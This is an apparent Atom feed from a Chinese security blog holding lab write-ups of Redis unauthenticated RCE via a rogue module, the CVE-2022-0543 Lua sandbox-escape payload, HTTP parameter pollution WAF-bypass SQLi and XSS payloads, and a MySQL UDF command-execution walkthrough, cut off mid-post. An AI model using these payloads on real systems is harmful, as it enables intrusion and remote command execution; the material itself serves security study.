<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>言喻的博客</title>
  
  
  <link href="https://yanyuhh.github.io/atom.xml" rel="self"/>
  
  <link href="https://yanyuhh.github.io/"/>
  <updated>2022-10-19T07:25:38.090Z</updated>
  <id>https://yanyuhh.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Docker容器逃逸</title>
    <link href="https://yanyuhh.github.io/2022/10/19/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8-docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    <id>https://yanyuhh.github.io/2022/10/19/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8-docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</id>
    <published>2022-10-19T07:25:25.668Z</published>
    <updated>2022-10-19T07:25:38.090Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>redis 未授权访问 (CNVD-2019-21763)</title>
    <link href="https://yanyuhh.github.io/2022/09/20/redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20(CNVD-2019-21763)-redis-wei-shou-quan-fang-wen-cnvd-2019-21763/"/>
    <id>https://yanyuhh.github.io/2022/09/20/redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20(CNVD-2019-21763)-redis-wei-shou-quan-fang-wen-cnvd-2019-21763/</id>
    <published>2022-09-20T12:08:30.383Z</published>
    <updated>2022-09-20T13:39:34.638Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。<br>由于在Reids 4.x及以上版本中新增了模块功能，攻击者可通过外部拓展，在Redis中实现一个新的Redis命令。攻击者可以利用该功能引入模块，在未授权访问的情况下使被攻击服务器加载恶意.so 文件，从而实现远程代码执行。</p><p> 需要下载工具：<br> git clone <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a><br>git clone <a href="https://github.com/Ridter/redis-rce.git">https://github.com/Ridter/redis-rce.git</a><br>还有一个工具但是复现的时候没有用<br>git clone <a href="https://github.com/LoRexxar/redis-rogue-server.git">https://github.com/LoRexxar/redis-rogue-server.git</a></p><p>漏洞影响的产品版本包括：<br>Redis 2.x，3.x，4.x，5.x</p><p>参考文章：<br><a href="https://blog.csdn.net/qq_14902381/article/details/126308120">https://blog.csdn.net/qq_14902381/article/details/126308120</a><br><a href="https://cloud.tencent.com/developer/article/1627282">https://cloud.tencent.com/developer/article/1627282</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="一、下载这两个工具"><a href="#一、下载这两个工具" class="headerlink" title="一、下载这两个工具"></a>一、下载这两个工具</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br></pre></td></tr></table></figure><p>然后进入RedisModules-ExecuteCommand目录， 执行 make，进行编译，得到module.so 文件</p><p><img src="/../images/2022/09/image-1663675505133.png" alt="image-1663675505133"></p><p><img src="/../images/2022/09/image-1663675522063.png" alt="image-1663675522063"></p><h3 id="二、将module-so这个文件拖入，下载好的redis-rce文件夹。"><a href="#二、将module-so这个文件拖入，下载好的redis-rce文件夹。" class="headerlink" title="二、将module.so这个文件拖入，下载好的redis-rce文件夹。"></a>二、将module.so这个文件拖入，下载好的redis-rce文件夹。</h3><p><img src="/../images/2022/09/image-1663675550648.png" alt="image-1663675550648"></p><h3 id="三、执行命令getshell"><a href="#三、执行命令getshell" class="headerlink" title="三、执行命令getshell"></a>三、执行命令getshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rce.py -r xxx.xxx.xxx.xxx -p xxxx -L xxx.xxx.xxx.xxx -P xxxx -f module.so</span><br></pre></td></tr></table></figure><p>（-r：靶机ip，-p 靶机端口；-L：kali的ip，-P:kali的端口）</p><p><img src="/../images/2022/09/image-1663675608183.png" alt="image-1663675608183"></p><h3 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h3><p>修复方式</p><p>1、禁止外部访问Redis 服务端口；</p><p>2、禁止使用root权限启动Redis服务；</p><p>3、配置安全组，限制可连接Redis服务器的IP。</p><p>建议使用Redis数据库的信息系统运营者进行自查，发现存在漏洞后，按照临时解决方案及时进行修复。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。&lt;</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://yanyuhh.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis沙盒逃逸(CVE-2022-0543)漏洞复现</title>
    <link href="https://yanyuhh.github.io/2022/09/20/Redis%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8(CVE-2022-0543)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-redis-sha-he-tao-yi-cve-2022-0543-lou-dong-fu-xian/"/>
    <id>https://yanyuhh.github.io/2022/09/20/Redis%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8(CVE-2022-0543)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-redis-sha-he-tao-yi-cve-2022-0543-lou-dong-fu-xian/</id>
    <published>2022-09-20T06:58:47.920Z</published>
    <updated>2022-09-20T11:54:42.873Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。<br>Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。<br>我们借助Lua沙箱中遗留的变量package的loadlib函数来加载动态链接库&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0里的导出函数luaopen_io。在Lua中执行这个导出函数，即可获得io库，再使用其执行命令</p><p>环境搭建：<br>使用的是<a href="https://vulfocus.cn/">https://vulfocus.cn/</a> 里面的redis靶机<br>Linux 操作系统</p><p> 工具准备：<br> apt-get install redis-server  安装redis-cli工具 </p><p>影响版本:<br>2.2 &lt;&#x3D; redis &lt; 5.0.13<br>2.2 &lt;&#x3D; redis &lt; 6.0.15<br>2.2 &lt;&#x3D; redis &lt; 6.2.5</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1-在攻击机中使用-redis-客户端对靶机进行连接"><a href="#1-在攻击机中使用-redis-客户端对靶机进行连接" class="headerlink" title="1. 在攻击机中使用 redis 客户端对靶机进行连接"></a>1. 在攻击机中使用 redis 客户端对靶机进行连接</h3><p>这个漏洞需要先未授权进入redis 才可以，现在进入redis的主流两种方法一直是爆破密码，一种是redis的历史漏洞</p><p>redis未授权访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.1.128(靶场ip) -p 6379(端口)</span><br></pre></td></tr></table></figure><p><img src="/../images/2022/09/image-1663674655898.png" alt="image-1663674655898"></p><br>redis 弱口令爆破<p>爆破工具推荐：<br><a href="https://github.com/shack2/SNETCracker">https://github.com/shack2/SNETCracker</a></p><h3 id="2-输入恶意-payload"><a href="#2-输入恶意-payload" class="headerlink" title="2. 输入恶意 payload"></a>2. 输入恶意 payload</h3><p>这里的 whoami 就是要执行的命令，可以根据自己的需求更换其他命令。<br>这里可以看到whoami已经成功执行</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;whoami&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br><span class="line">image.png</span><br></pre></td></tr></table></figure><p> <img src="/../images/2022/09/image-1663674666134.png" alt="image-1663674666134"></p><h3 id="3-修复建议"><a href="#3-修复建议" class="headerlink" title="3. 修复建议"></a>3. 修复建议</h3><p>1、更新至最新版本<br>2、在 Lua 初始化的末尾添加package&#x3D;nil</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。&lt;br&gt;Debian以及Ubuntu发行版的源在打包Re</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://yanyuhh.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>HPP 参数污染</title>
    <link href="https://yanyuhh.github.io/2022/09/14/HPP%20%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93-hpp-can-shu-wu-ran/"/>
    <id>https://yanyuhh.github.io/2022/09/14/HPP%20%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93-hpp-can-shu-wu-ran/</id>
    <published>2022-09-14T14:57:16.205Z</published>
    <updated>2022-09-14T15:06:10.828Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、HPP概念"><a href="#一、HPP概念" class="headerlink" title="一、HPP概念"></a>一、HPP概念</h3><p>HTTP Parameter Pollution即HTTP参数污染，简称HPP。<br>是web容器处理HTTP参数的一种方式。</p><p>HTTP 参数污染 (HPP) 是一种 Web 攻击规避技术，允许攻击者通过更改 HTTP 请求以操纵或搜索隐藏信息。这种规避技术基于在具有相同名称的参数的多个实例之间拆分攻击向量。<br>某些环境通过从请求中连接的参数名称的所有实例中获取的值来处理此类请求。</p><p>通常，攻击者可以利用 HPP 漏洞有如下几点：</p><ol><li>取代现有的硬编码 HTTP 参数。</li><li>更改或修改预期&#x2F;正常的应用程序行为。</li><li>访问并可能利用未正确控制的变量。</li><li>绕过 WAF 规则或输入验证机制</li></ol><h3 id="二、HPP实质"><a href="#二、HPP实质" class="headerlink" title="二、HPP实质"></a>二、HPP实质</h3><p><img src="/../images/2022/09/image-1663166598373.png" alt="image-1663166598373"><br><img src="/../images/2022/09/image-1663166603732.png" alt="image-1663166603732"></p><p>观察这两个url ，在HTTP请求中，使用&amp;可以连接不同的参数。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.215.129/hpp.php?str=123&amp;str=456</span><br></pre></td></tr></table></figure><p>那么此时在取值时只输出最后一个参数，输出则为456。这就是HTTP参数污染。</p><h3 id="三、HPP漏洞分类"><a href="#三、HPP漏洞分类" class="headerlink" title="三、HPP漏洞分类"></a>三、HPP漏洞分类</h3><h4 id="1、服务端HPP"><a href="#1、服务端HPP" class="headerlink" title="1、服务端HPP"></a>1、服务端HPP</h4><p>在服务器端HPP中，尝试给服务器端发送非预期信息来让服务器端代码返回非预期的结果。</p><p>让我们看一个例子，如果银行通过网站接收URL参数发起转账，可能会造成服务器端HPP漏洞。<br>我们观察这个URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com/transferMoney.php?from=Aboy&amp;to=Bgirl&amp;amount=5000</span><br></pre></td></tr></table></figure><p>Aboy向Bgirl转账5000，此时我们在后面再添加一个to参数;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com/transferMoney.php?from=Aboy&amp;to=Bgirl&amp;amount=5000&amp;to=Cboy</span><br></pre></td></tr></table></figure><p>如果银行信任它接收到的最后一个to参数，此时就不是Aboy向Bgirl转账5000，而是Aboy向Cboy转账5000。<br>当服务器接收到多个具有相同名称的参数时，它可以通过多种方式去响应。<br>在大多数情况下，PHP 和 Apache取参数的最后一次赋值，Apache Tomcat取参数的第一次赋值，ASP 和 IIS 取参数的所有赋值。</p><h4 id="2、客户端HPP"><a href="#2、客户端HPP" class="headerlink" title="2、客户端HPP"></a>2、客户端HPP</h4><p>客户端HPP漏洞使攻击者可以向URL中注入额外的参数，从而对客户端产生影响(客户端最常见的操作方式是个人电脑，通常是通过浏览器触发，并不是发生在网站的服务器端)。</p><h3 id="四、实战案例总结："><a href="#四、实战案例总结：" class="headerlink" title="四、实战案例总结："></a>四、实战案例总结：</h3><p>HPP漏洞的产生原因一方面来自服务器处理机制的不同，另一方面来自开发人员后端检测逻辑的问题。<br>HTTP 参数污染的风险实际上取决于后端所执行的操作，以及被污染的参数提交到了哪里。总体上HPP一般有两种利用场景：</p><p>1）逻辑漏洞，通常会造成IDOR，信息泄露，越权等漏洞;<br>2）作为其他漏洞的辅助，用于绕过漏洞的检测和Waf等。<br>这里汇总了工作中和国内外遇到的一些典型案例：</p><h4 id="一、-逻辑漏洞（IDOR）"><a href="#一、-逻辑漏洞（IDOR）" class="headerlink" title="一、 逻辑漏洞（IDOR）"></a>一、 逻辑漏洞（IDOR）</h4><h5 id="1、IDOR（不安全的对象引用）"><a href="#1、IDOR（不安全的对象引用）" class="headerlink" title="1、IDOR（不安全的对象引用）"></a>1、IDOR（不安全的对象引用）</h5><p>一般的社交软件都有“关注”或”喜欢”功能，下面就是ID为5318415对5333003进行关注发送的数据包：</p><p>按我们通常挖掘逻辑漏洞的思路，我们可以篡改ID值，使对方关注我。这里5318415是我的ID，但将我的actorId替换为对方的ID，会收到“401 Unauthorized”错误，说明此处做了鉴权操作。</p><p>但是，如果请求2个actorId参数，第一个actorId参数是目标的actorId。这样5024700（受害者）会关注5318415（我）。这次得到的响应是202 Accepted。</p><p>后台对于actorId的鉴权操作是对第二个，关注操作取的却是第一个。所以在测试越权类问题时未果不妨多试一步HPP，下面Twitter案例也是如出一辙：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://twitter.com/i/u?iid=F6542&amp;uid=2321301342&amp;uid=1134885524&amp;nid=22+26</span><br></pre></td></tr></table></figure><p>通过添加第二个uid，取消Twitter的邮箱提醒。</p><h5 id="2、-社交分享链接"><a href="#2、-社交分享链接" class="headerlink" title="2、 社交分享链接"></a>2、 社交分享链接</h5><p>不少网站都有社交分享按钮，可以把内容分享到其他社交媒体，如Hackerone的链接为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackerone.com/blog/introducing-signal</span><br></pre></td></tr></table></figure><p>分享到FB上链接为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal</span><br></pre></td></tr></table></figure><p>如果我们将要分享的Hackerone的链接改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov</span><br></pre></td></tr></table></figure><p>则最终的跳转会成为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov</span><br></pre></td></tr></table></figure><p>后一个参数u拥有比第一个更高的优先级，之后会用于 Fackbook 的发布，最终会跳转到恶意站点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://vk.com/durov</span><br></pre></td></tr></table></figure><h5 id="3、-页面跳转"><a href="#3、-页面跳转" class="headerlink" title="3、 页面跳转"></a>3、 页面跳转</h5><p>一个Digits跳转的案例，跳转链接如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv</span><br></pre></td></tr></table></figure><p>如果直接修改参数为<a href="http://attacker.com，由于注册域不匹配，因此页面将显示错误，但如果我们使用HPP：">http://attacker.com，由于注册域不匹配，因此页面将显示错误，但如果我们使用HPP：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv&amp;host=http://attacker.com</span><br></pre></td></tr></table></figure><p>从而第一个host参数绕过验证，取第二个host参数作为跳转源。</p><h4 id="二、绕过检测（WAF）"><a href="#二、绕过检测（WAF）" class="headerlink" title="二、绕过检测（WAF）"></a>二、绕过检测（WAF）</h4><h5 id="1、SQL绕过1"><a href="#1、SQL绕过1" class="headerlink" title="1、SQL绕过1"></a>1、SQL绕过1</h5><p>一个常见的SQL注入payload如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/horse.php?id=7 union select 1,2,3，current_user</span><br></pre></td></tr></table></figure><p>探测发现网站配置了WAF来阻止任意包含“select”或“union”等常用的SQL查询关键字，通过HPP绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/horse.php?id=0&amp;amp;id=7%20union%20select%201,2,3,current_user</span><br></pre></td></tr></table></figure><p>注入语句被写到第二个参数值的位置，不会被waf解析。</p><h5 id="2、-SQL绕过2"><a href="#2、-SQL绕过2" class="headerlink" title="2、 SQL绕过2"></a>2、 SQL绕过2</h5><p>ModSecurity过滤器会将类似于select1,2,3 from table这类的语句归类为黑名单。<br>但是这个web服务器在遇到为同一个参数赋值不同数值时，会采取类似谷歌的处理方式，将参数连接起来，以此来绕过黑名单。</p><p>例如提交如下的URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/index.aspx?page=select 1&amp;page=2,3 from table</span><br></pre></td></tr></table></figure><h5 id="3、Apple-Cups的XSS"><a href="#3、Apple-Cups的XSS" class="headerlink" title="3、Apple Cups的XSS"></a>3、Apple Cups的XSS</h5><p>Apple Cups是被许多UNIX系统利用的打印系统。系统对kerberos进行了黑名单过滤，通过前置一个重复参数可以触发xss：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/?kerberos=onmouseover=alert(1)&amp;kerberos=</span><br></pre></td></tr></table></figure><p>这个方法可以绕过系统的验证机制，原因是这个验证系统只采纳了第二个kerberos的值，这个值为空，因此不会触发。<br>而第一个kerberos直到被用于构建动态HTML内容前都没有被验证。<br>最终在web站点的上下文中javascript语句被执行。</p><h5 id="4、URL重定向-HPP-XSS"><a href="#4、URL重定向-HPP-XSS" class="headerlink" title="4、URL重定向+HPP+XSS"></a>4、URL重定向+HPP+XSS</h5><p>在点击网站的链接时，会将用户重定向到一个页面，链接为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.aspx?dest=http://whitelistedWebsite.com</span><br></pre></td></tr></table></figure><p>这容易想到URL重定向漏洞，经过探测，发现dest参数接受的协议有http:&#x2F;&#x2F; ftp:&#x2F;&#x2F; http:&#x2F; javascript:&#x2F;，所以尝试构造xss：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dest=javascript://alert(document.domain)</span><br></pre></td></tr></table></figure><p>发现存在白名单限制，尝试绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dest=javascript:/whitelistedWebsite.com/i;alert(document.domain</span><br></pre></td></tr></table></figure><p>但分号；会无法解析，导致报错，最终使用HPP绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dest=javascript:/whitelistedWebsite.com/i&amp;dest=alert(1)</span><br></pre></td></tr></table></figure><p>原理和例1类似，接受两个参数值进行拼接：javascript:&#x2F;&#x2F;alert(1)</p><h3 id="五、挖掘技巧："><a href="#五、挖掘技巧：" class="headerlink" title="五、挖掘技巧："></a>五、挖掘技巧：</h3><p>根据上面的实战案例总结，在挖掘HPP漏洞的时候，需要注意以下几点：<br>1、和IDOR漏洞挖掘类似，关注与用户权限紧密相关的参数，有些场景可能防范了IDOR，但重复提交参数可能就会产生奇效；<br>2、在挖掘其他漏洞的时候，如果进行了检测又无法绕过的情况下，可以尝试通过重复提交参数&#x2F;参数拼接方式绕过检测。</p><h3 id="六、预防"><a href="#六、预防" class="headerlink" title="六、预防"></a>六、预防</h3><p>为了防止这些类型的漏洞，应该执行广泛和适当的输入验证。有符合每种网络技术&#x2F;语言的安全方法。此外，应该提高对客户&#x2F;用户可以提供多个参数这一事实的认识。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一、HPP概念&quot;&gt;&lt;a href=&quot;#一、HPP概念&quot; class=&quot;headerlink&quot; title=&quot;一、HPP概念&quot;&gt;&lt;/a&gt;一、HPP概念&lt;/h3&gt;&lt;p&gt;HTTP Parameter Pollution即HTTP参数污染，简称HPP。&lt;br&gt;是web容器</summary>
      
    
    
    
    <category term="other" scheme="https://yanyuhh.github.io/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>Mysql的Udf Mof 提权</title>
    <link href="https://yanyuhh.github.io/2022/09/14/Mysql%E7%9A%84Udf%20Mof%20%E6%8F%90%E6%9D%83-mysql%E7%9A%84udfmof%E6%8F%90%E6%9D%83/"/>
    <id>https://yanyuhh.github.io/2022/09/14/Mysql%E7%9A%84Udf%20Mof%20%E6%8F%90%E6%9D%83-mysql%E7%9A%84udfmof%E6%8F%90%E6%9D%83/</id>
    <published>2022-09-14T14:26:20.092Z</published>
    <updated>2022-09-19T16:24:07.022Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Udf提权"><a href="#Udf提权" class="headerlink" title="Udf提权"></a>Udf提权</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>1、什么是udf</p><p>udf &#x3D; “user defined function”,即‘用户自定义函数’。是通过添加新函数，对MYSQL的功能进行扩充，性质就像使用本地MYSQL函数如abs()或concat()。udf在mysql5.1以后的版本中，存在于’mysql&#x2F;lib&#x2F;plugin’目录下，文件后缀为’.dll’</p><p>2、实验环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win7 x64 </span><br><span class="line">phpstudy 2018 </span><br><span class="line">mysql 5.1.60 </span><br></pre></td></tr></table></figure><p>3、利用条件</p><ol><li>知道数据库的用户和密码；</li><li>mysql可以远程登录；</li><li>mysql有写入文件的权限，即secure_file_priv的值为空。</li></ol><h3 id="一、查看是否有可写权限"><a href="#一、查看是否有可写权限" class="headerlink" title="一、查看是否有可写权限:"></a>一、查看是否有可写权限:</h3><p> 在MySQL5.5、5.6、5.7版本：my.ini中无此参数，查询该参数情况为NULL</p><p> 查看secure_file_priv是否开启 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27; </span><br></pre></td></tr></table></figure><p><img src="/../images/2022/09/image.png" alt="image"></p><p>因为状态为NULL,我们需要修改my.ini，开启secure_file_priv，<br>打开my.ini，查找secure_file_priv。</p><ol><li>存在，修改为secure_file_priv&#x3D;””</li><li>不存在，则在[mysqld]下，新增secure_file_priv&#x3D;””<br>修改之后，重启数据库<br>再次查看，成功开启</li></ol><p><img src="/../images/2022/09/image-1663164687626.png" alt="image-1663164687626"></p><h3 id="二、查看系统版本，和安装目录，添加合适的udf-dll"><a href="#二、查看系统版本，和安装目录，添加合适的udf-dll" class="headerlink" title="二、查看系统版本，和安装目录，添加合适的udf.dll"></a>二、查看系统版本，和安装目录，添加合适的udf.dll</h3><p>查看系统版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%compile%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../images/2022/09/image-1663164850133.png" alt="image-1663164850133"></p><p>查看mysql目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br></pre></td></tr></table></figure><p><img src="/../images/2022/09/image-1663164867906.png" alt="image-1663164867906"></p><h3 id="三、如何添加-udf-dll"><a href="#三、如何添加-udf-dll" class="headerlink" title="三、如何添加 udf.dll"></a>三、如何添加 udf.dll</h3><p>udf.dll 在sqlmap里面对应的目录地址为 \sqlmap\data\udf\mysql,不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。<br>这里如果后缀名为.so_ (linux)或dll_(windows)的话，就需要解码，如果后缀名为.so或.dll的话就不需要解码即可直接使用。<br>这里sqlmap也自带了解码的py脚本，在&#x2F;extra&#x2F;cloak目录下，使用cloak.py解密即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure><p>Mysql版本大于5.1:<br>udf.dll文件必须放在MySQL安装目录的lib\plugin文件夹下。（plugin文件夹默认不存在，需要创建）。<br>没找到创建的方法，直接新建了目录</p><p>Mysql版本小于5.1：<br>如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\Winnt\udf.dll 下。<br>如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。</p><p> 这里，通过如下命令将dll文件写入到plugin中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#x27;C:\\Users\\hp\\Desktopl\\lib_mysqludf_sys.dll&#x27;)) into dumpfile &#x27;C:\\phpStudy\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\plugin\\udf.dll&#x27;;</span><br><span class="line">#这里windows下目录结构要进行转义双写</span><br></pre></td></tr></table></figure><p><img src="/../images/2022/09/image-1663165041069.png" alt="image-1663165041069"></p><h3 id="四、-创建自定义函数"><a href="#四、-创建自定义函数" class="headerlink" title="四、 创建自定义函数"></a>四、 创建自定义函数</h3><p>上传之后，使用如下命令创建自定义函数，在这里发现在Mysql5.7.26没办法创建自定义函数，然后把Mysql改成了5.1.60，然后就执行成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/upload/2022/09/image-1663165286871.png" alt="image-1663165286871"></p><p>使用命令查看是否新增了sys_eval函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure><p><img src="/../images/2022/09/image-1663165345581.png" alt="image-1663165345581"></p><p>执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/../images/2022/09/image-1663165506492.png" alt="image-1663165506492"></p><p>如果出现以下两种报错，可能是因为使用 lib_mysqludf_sys_64.dll 失败了，使用 lib_mysqludf_sys_32.dll 就会成功，所以这里的 dll 应该和系统位数无关，可能和 MySQL 的安装版本有关系，而 PHPStudy 自带的 MySQL 版本是 32 位的。</p><p><img src="/../images/2022/09/image-1663165534221.png" alt="image-1663165534221"></p><p><img src="/../images/2022/09/image-1663165538522.png" alt="image-1663165538522"></p><h3 id="五、删除自定义函数"><a href="#五、删除自定义函数" class="headerlink" title="五、删除自定义函数"></a>五、删除自定义函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_eval;</span><br></pre></td></tr></table></figure><h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h3><p>UDF提权其实限制条件挺多的，它似乎不能让你提升权限，只是让你在mysql中执行系统命令。限制条件如下<br>● 